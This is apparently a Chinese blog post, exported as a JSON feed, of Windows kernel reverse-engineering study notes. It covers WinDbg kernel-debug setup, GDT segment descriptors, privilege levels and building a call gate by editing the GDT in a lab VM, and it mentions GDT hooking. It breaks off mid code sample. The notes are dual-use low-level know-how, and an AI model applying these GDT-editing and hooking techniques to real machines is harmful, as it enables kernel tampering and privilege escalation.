{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"逆向\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/10/03/hg%20ker/",
            "url": "http://example.com/2023/10/03/hg%20ker/",
            "title": "hg内核",
            "date_published": "2023-10-03T05:38:45.000Z",
            "content_html": "<p><strong>更新中</strong></p>\n<h1 id=\"hg内核\"><a class=\"markdownIt-Anchor\" href=\"#hg内核\">#</a> hg 内核</h1>\n<h2 id=\"环境配置\"><a class=\"markdownIt-Anchor\" href=\"#环境配置\">#</a> 环境配置</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msconfig</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit  /copy &#123;current&#125; /d debug</span><br><span class=\"line\">已将该项成功复制到 &#123;9f1759e1-dbea-11ec-93bf-c2eeac6128aa&#125;。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit.exe /displayorder &#123;39ce96d1-40cb-11ee-adc5-e87c8ac93724&#125; /addlast</span><br><span class=\"line\">操作成功完成。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit.exe /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200</span><br><span class=\"line\">操作成功完成。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit.exe /bootdebug &#123;39ce96d0-40cb-11ee-adc5-e87c8ac93724&#125; ON</span><br><span class=\"line\">操作成功完成。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit.exe/debug &#123;39ce96d0-40cb-11ee-adc5-e87c8ac93724&#125; ON</span><br><span class=\"line\">操作成功完成。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;bcdedit.exe /timeout 30</span><br><span class=\"line\">操作成功完成。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230930200944405.png\" alt=\"image-20230930200944405\"></p>\n<p>重启需要使用系统重启，不能使用 vm 的重启</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230930201418886.png\" alt=\"image-20230930201418886\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;E:\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe&quot; -y SRV*E:\\symbol*http://msdl.microsoft.com/download/symbols -b -k com:port=//./pipe/com_1,baud=115200,pipe</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230930202041547.png\" alt=\"image-20230930202041547\"></p>\n<p>开启配置了 debug 引导的虚拟机，并且开启 windbg</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230930202225347.png\" alt=\"image-20230930202225347\"></p>\n<p>lm</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230930202654966.png\" alt=\"image-20230930202654966\"></p>\n<p>.reload 根据需要加载符号</p>\n<p>ld * 加载全部符号</p>\n<p>安装 wdm 后，创建 wdm driver</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001204151853.png\" alt=\"image-20231001204151853\"></p>\n<p>关闭 spectre</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001205417683.png\" alt=\"image-20231001205417683\"></p>\n<p>关闭警告</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001205358986.png\" alt=\"image-20231001205358986\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001205508311.png\" alt=\"image-20231001205508311\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001205756116.png\" alt=\"image-20231001205756116\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">DriverUnload</span><span class=\"params\">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">DbgPrintEx</span>(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;11111111111111&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">NTSTATUS <span class=\"title\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">DbgPrintEx</span>(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;22222&quot;</span>);</span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DriverUnload;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"保护模式\"><a class=\"markdownIt-Anchor\" href=\"#保护模式\">#</a> 保护模式</h2>\n<h3 id=\"cpu\"><a class=\"markdownIt-Anchor\" href=\"#cpu\">#</a> CPU</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001220009107.png\" alt=\"image-20231001220009107\"></p>\n<p>8086 实现了一半的保护模式，80386 完全实现保护模式</p>\n<p>80486  奔腾  引入超线程  1 个 物理核虚拟出两个逻辑 cpu。寄存器，流水线，多了二级缓存</p>\n<p>CPU 架构</p>\n<p>RISC：移动端 ARM，定长硬编码，低耗电，一页 2kb，三级流水线</p>\n<p>CISC：PC 端，变长硬编码，支持更多指令集，至少有五级流水线，一页是 4kb</p>\n<p>CISC 架构指令执行过程</p>\n<p>取指令，指令译码，访存取数，指令执行，结果写回</p>\n<p>流水线</p>\n<p>当大 jmp 到一个 eip 时，会清空局部缓存，局部缓存大约能存 9-32 条指令。执行预取，缓存指令</p>\n<p>通过 JCC 跳转不会清空局部缓存，jmp 可以跳 2G，清空局部缓存</p>\n<p>实模式下 ，段地址 * 0x10 + 逻辑地址 = 线性地址，导致可以跨进程修改内存</p>\n<p>保护模式有 gdt 表，标识权限。多个进程共享一个内核</p>\n<h3 id=\"段寄存器\"><a class=\"markdownIt-Anchor\" href=\"#段寄存器\">#</a> 段寄存器</h3>\n<p>保护模式下一共有六个段寄存器，实模式只有四个</p>\n<p>实模式：</p>\n<p>CS (Code Segment)：代码段寄存器；<br>\n  DS (Data Segment)：数据段寄存器；<br>\n  SS (Stack Segment)：堆栈段寄存器；<br>\n  ES (Extra Segment)：附加段寄存器；</p>\n<p>保护模式：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231002212824591.png\" alt=\"image-20231002212824591\"></p>\n<p>32 位下没有 GS，GS 是 64 位下用的</p>\n<p>段名称后面的数字是段选择子</p>\n<p>全局变量是 ds 段描述的，局部变量是 ss 描述的</p>\n<p>段是有权限的，读写执行</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD value = <span class=\"number\">100</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvalue = <span class=\"number\">1000</span>;</span><br><span class=\"line\">\t__asm&#123;   <span class=\"comment\">// x86中插入内联汇编</span></span><br><span class=\"line\">\t\tmov ax,cs</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov eax,<span class=\"number\">100</span></span><br><span class=\"line\">\t\tmov dword ptr ds:[value],eax    <span class=\"comment\">// CS 没有写的属性</span></span><br><span class=\"line\">\t\tmov ax,es      <span class=\"comment\">// DS 和 ES 段选择子此处相同，可以用ES还原被修改为CS的DS</span></span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kd&gt; r\t\t\t\t// 看寄存器</span><br><span class=\"line\">rax=000000000000ea01 rbx=00000000002001d1 rcx=0000000000000001</span><br><span class=\"line\">rdx=0000000000000073 rsi=00000000000186a0 rdi=fffff80004005e80</span><br><span class=\"line\">rip=fffff80003e8b490 rsp=fffff800054c3888 rbp=fffff78000000320</span><br><span class=\"line\"> r8=fffffa8018df2000  r9=0000000000000072 r10=00000000ffffffff</span><br><span class=\"line\">r11=fffff800054c3770 r12=0000000000000000 r13=fffff800054c39c0</span><br><span class=\"line\">r14=0000000000000004 r15=0000000000000001</span><br><span class=\"line\">iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class=\"line\">nt!RtlpBreakWithStatusInstruction:</span><br><span class=\"line\">fffff800`03e8b490 cc              int     3</span><br><span class=\"line\"></span><br><span class=\"line\">kd&gt; r gdtr \t\t\t// windbg的寄存器</span><br><span class=\"line\">gdtr=fffff800054bc000</span><br><span class=\"line\"></span><br><span class=\"line\">kd&gt; dq fffff800054bc000\t\t\t\t// 看内存 db dw dd dq</span><br><span class=\"line\">fffff800`054bc000  00000000`00000000 00000000`00000000</span><br><span class=\"line\">fffff800`054bc010  00209b00`00000000 00cf9300`0000ffff</span><br><span class=\"line\">fffff800`054bc020  00cffb00`0000ffff 00cff300`0000ffff</span><br><span class=\"line\">fffff800`054bc030  0020fb00`00000000 00000000`00000000</span><br><span class=\"line\">fffff800`054bc040  05008b4b`d0800067 00000000`fffff800</span><br><span class=\"line\">fffff800`054bc050  ff40f3fd`a0003c00 00000000`00000000</span><br><span class=\"line\">fffff800`054bc060  00cf9a00`0000ffff 00000000`00000000</span><br><span class=\"line\">fffff800`054bc070  00000000`00000000 00000000`00000000</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; r</span><br><span class=\"line\">eax=00000001 ebx=00026160 ecx=863f8c78 edx=00000000 esi=83f36d20 edi=83f38654</span><br><span class=\"line\">eip=83e86110 esp=83f33b14 ebp=83f33b48 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202</span><br><span class=\"line\">0: kd&gt; r gdtr</span><br><span class=\"line\">gdtr=80b99000</span><br><span class=\"line\">0: kd&gt; dq 80b99000</span><br><span class=\"line\">80b99000  00000000`00000000 00cf9b00`0000ffff</span><br><span class=\"line\">80b99010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class=\"line\">80b99020  00cff300`0000ffff 80008b1e`400020ab</span><br><span class=\"line\">80b99030  834093f3`6c003748 0040f300`00000fff</span><br><span class=\"line\">80b99040  0000f200`0400ffff 00000000`00000000</span><br><span class=\"line\">80b99050  830089f3`40000068 830089f3`40680068</span><br><span class=\"line\">80b99060  00000000`00000000 00000000`00000000</span><br><span class=\"line\">80b99070  800092b9`900003ff 00000000`00000000</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003204330216.png\" alt=\"image-20231003204330216\"></p>\n<p>LDT：  local Descriptor table</p>\n<p>GDT： Global Descriptor table</p>\n<p>DS == 23 == 0010 0011</p>\n<p>RPL==11</p>\n<p>TI == 0   // =0 查 GDT，=1 查 LDT</p>\n<p>Index == 0010 0  == 0x04   // 查 GDT 第四项   <code>00cff300</code> 0000ffff`</p>\n<p><code>00cff300</code> 0000ffff`</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003204845003.png\" alt=\"image-20231003204845003\"></p>\n<p>Segment Limit:   f ffff</p>\n<p>Base Address:  0000 0000   基址</p>\n<p>type: 3</p>\n<p>s:1    系统段为 0 普通段为 1</p>\n<p>DPL:3</p>\n<p>P:1\t\t段有效标识，=1 段有效</p>\n<p>AVL: 0</p>\n<p>D/B:1</p>\n<p>G:1</p>\n<p>type:3</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003205741643.png\" alt=\"image-20231003205741643\"></p>\n<p>A 是否被访问过。数据段至少是可读的</p>\n<p>快速定位 gdtr 表中位置  1B (段选择子)  &amp; fff8 = x = 18</p>\n<p>dq $(gdtr) + x  == 00cffb00`0000ffff</p>\n<p>CS:1B</p>\n<p>base: 00000000</p>\n<p>limit: fffff</p>\n<p>type: b  // 没有写权限</p>\n<p>s:1</p>\n<p>DPL: 3</p>\n<p>P:1</p>\n<p>AVL: 0</p>\n<p>D/B:1</p>\n<p>G:1</p>\n<h4 id=\"实验\"><a class=\"markdownIt-Anchor\" href=\"#实验\">#</a> 实验：</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kd&gt; eq 80b99000+0x48 00cff300`0001ffff \t// 修改内存</span><br><span class=\"line\">kd&gt; dq 80b99000+0x48   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD value = 0x100;</span><br><span class=\"line\">DWORD value2 = 0;</span><br><span class=\"line\">__asm&#123;</span><br><span class=\"line\">    mov ax, 0x4b</span><br><span class=\"line\">    mov ds,ax</span><br><span class=\"line\">    mov eax,dword ptr ds:[value]\t\t// eax值错乱</span><br><span class=\"line\">    mov value2, eax</span><br><span class=\"line\">    mov ax,es</span><br><span class=\"line\">    mov ds,ax\t\t\t// 还原后base值 变回0</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>[00277000] 逻辑地址</p>\n<p>逻辑地址会和 base 相加</p>\n<p>如果 base 不是 0</p>\n<p>会变成 [00277000 + base] 导致值变了</p>\n<p>但是最后会还原 ds 的值，只是中断在那行的时候值会变</p>\n<p>gdt hook 改 base</p>\n<p>hook int 3</p>\n<p>base + idt.offset = 0x48</p>\n<p>0x12345678 - idt.offset = value</p>\n<p>gdt.48.base = value</p>\n<h3 id=\"db_g\"><a class=\"markdownIt-Anchor\" href=\"#db_g\">#</a> DB_G</h3>\n<p>64 位中没有 limit 和 base</p>\n<h4 id=\"g\"><a class=\"markdownIt-Anchor\" href=\"#g\">#</a> G</h4>\n<p>1 页 = 4096 字节</p>\n<p>G= 1 时，fffff 的单位是页 ，范围 (0xfffff+1) * 0x1000 == 0x100000000 - 1 = 0xffff ffff</p>\n<p>G=0 按照字节为单位</p>\n<h4 id=\"db\"><a class=\"markdownIt-Anchor\" href=\"#db\">#</a> D/B</h4>\n<p>default/bit</p>\n<p>D/B 描述 CS 时：</p>\n<p>D/B = 1 寻址空间为 32 位</p>\n<p>D/B = 0 16 位</p>\n<p>更变 cs， jmp 0x4b:402344</p>\n<p>此时 push 的时候压栈只压 2 字节</p>\n<p>进入内核的时候会修复所有段选择子，退出的时候在恢复</p>\n<p>D/B 描述数据段时     数据段 + 堆栈段</p>\n<p>D/B = 0 此时寻址宽度变为 16 位，esp 变为 sp，此时 push 的时候程序会直接崩溃，因为系统可访问的最低地址是 0x10000。此时 limit 描述的范围不能访问</p>\n<p>DB = 1 32 位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eq gdtr+0x48  008ff300`0000ffff</span><br><span class=\"line\"></span><br><span class=\"line\">mov ax,0x4b</span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">push 0   // 正常访问</span><br><span class=\"line\"></span><br><span class=\"line\">eq gdtr+0x48  008ff600`0000ffff</span><br><span class=\"line\">mov ax,0x4b</span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">push 0   // 异常</span><br><span class=\"line\"></span><br><span class=\"line\">eq gdtr+0x48  00c0f600`00000000</span><br><span class=\"line\">mov ax,0x4b</span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">push 0   // 异常</span><br></pre></td></tr></table></figure>\n<p>type =2 的时候，如果访问过，会自动变成 3 (accessed)</p>\n<p>DB=0 limit 描述的区域都不能访问，向下扩展</p>\n<p>DB=1 描述的区域可以访问，向上扩展</p>\n<p>DB=0，limit=0 全部可以访问</p>\n<p>DB=0，type=6，limit=fffff ，全部都不能访问</p>\n<p>向上扩展： 没有描述的区域可以访问。</p>\n<p>向下扩展：描述的区域可以访问</p>\n<p>保护模式分为</p>\n<p>段页模式</p>\n<p>纯段模式</p>\n<p>纯段模式下：一致代码段：R3 直接调用 R0   非一致代码段：</p>\n<h3 id=\"权限检测\"><a class=\"markdownIt-Anchor\" href=\"#权限检测\">#</a> 权限检测</h3>\n<p>关闭增量连接，只有 debug 有</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004203140286.png\" alt=\"image-20231004203140286\"></p>\n<h4 id=\"裸函数\"><a class=\"markdownIt-Anchor\" href=\"#裸函数\">#</a> 裸函数</h4>\n<p>64 位没有裸函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __declspec(naked) test2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;   // 有些编译器不能这么写，因为没提升堆栈</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>裸函数没有对堆栈做操作，如果在裸函数中没有保存现场用堆栈会出问题</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006202157199.png\" alt=\"image-20231006202157199\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006202220240.png\" alt=\"image-20231006202220240\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006202344305.png\" alt=\"image-20231006202344305\"></p>\n<p>DPL 段描述权限</p>\n<p>RPL：request privilege level 看当前指令的段描述符   比如 mov dword ptr ds:[],0x12345678 ，DS 描述的这条，此时 RPL 为 DS 的 RPL</p>\n<p>CPL：current privilege level 当前权限    值为 CS  SS 的 RPL。两个 RPL 必须一致</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006202616101.png\" alt=\"image-20231006202616101\"></p>\n<p>ring0 - ring3</p>\n<p>r0 权限最大</p>\n<p>主流操作系统只有 R0 和 R3</p>\n<p>VMware 特权级在 R1 早期，虚拟机操作系统在 R1</p>\n<p>CS/SS 最后一位代表在几环  B 1011   3   0011        11 在 ring3</p>\n<p>数据段取决于 CPL，CPL 数值上 &lt;= DPL 就可以访问到</p>\n<p>RPL = 0 ,CPL = 3 ,DPL = 3 可以请求到，RPL 在数据段意义不大</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eq gdtr+48  008ff300`0000ffff</span><br><span class=\"line\"></span><br><span class=\"line\">mov ax,0x48</span><br><span class=\"line\">mov ds,ax</span><br><span class=\"line\">mov edx,dword ptr ds:[eax]</span><br><span class=\"line\">// dpl &lt; cpl = rpl</span><br><span class=\"line\">// </span><br></pre></td></tr></table></figure>\n<p>堆栈段 CPL=RPL=DPL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,0x48</span><br><span class=\"line\">mov ss,ax</span><br><span class=\"line\">mov edx,dword ptr ss:[esp]</span><br><span class=\"line\">// 不能改</span><br></pre></td></tr></table></figure>\n<p>代码段 CPL=RPL=DPL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jmp far 4b:410112</span><br><span class=\"line\">// 不会异常，但也不会提权</span><br></pre></td></tr></table></figure>\n<h4 id=\"jmp-call-ref\"><a class=\"markdownIt-Anchor\" href=\"#jmp-call-ref\">#</a> jmp call ref</h4>\n<p>实验时关闭随机基址，链接器 -&gt; 高级 -&gt; 随机基址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jmp far 0x48:0x401000  // 不能这样在编译器里面写代码</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void __declspec(naked) test1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpop eax</span><br><span class=\"line\">\t\tjmp eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">char buf[] = &#123;0,0,0,0,0x48,0&#125;</span><br><span class=\"line\">*(int *)&amp;buf[0] = (ULONG)test1;</span><br><span class=\"line\">__asm&#123;</span><br><span class=\"line\">\tlea eax,[haha]</span><br><span class=\"line\">\tpush eax</span><br><span class=\"line\">\tjmp fword ptr buf</span><br><span class=\"line\">haha:</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>jmp call 没法同时修改 cs 和 ss，所以不能提权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __declspec(naked) test1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tretf    // 远返回，pop 8字节</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">char buf[] = &#123;0,0,0,0,0x48,0&#125;</span><br><span class=\"line\">*(int *)&amp;buf[0] = (ULONG)test1;</span><br><span class=\"line\">__asm&#123;</span><br><span class=\"line\">\tcall fword ptr buf</span><br><span class=\"line\">\t// 会压入返回地址和CS的段选择子，跨段不提权的call 会压8个字节</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>call 过去 jmp 回来</p>\n<h3 id=\"调用门\"><a class=\"markdownIt-Anchor\" href=\"#调用门\">#</a> 调用门</h3>\n<p>系统段在 GDT 中分成任务段和调用门</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006214637792.png\" alt=\"image-20231006214637792\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231006214841959.png\" alt=\"image-20231006214841959\"></p>\n<p>函数的逻辑地址：offset in segment</p>\n<p>段选择子：segment selector  0 环默认 08</p>\n<p>param count 调用门压入参数</p>\n<p>type：1100 32-bit call gate</p>\n<p>DPL：门权限，=3，同等权限才能进入</p>\n<p>组装调用门描述符</p>\n<p>00401000</p>\n<p>0040ec00`00081000</p>\n<p>call 0x48:0x0     如果是调用门，偏移是 offset in segment，后面的 0x 随便写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef int (__CRTDECL *xxxxx)(_In_z_ _Printf_format_string_ char const* const _Format,...);</span><br><span class=\"line\">xxxxx x1 = NULL;</span><br><span class=\"line\">char* strings = &quot;sssssss&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void __declspec(naked) test1()</span><br><span class=\"line\">&#123;</span><br><span 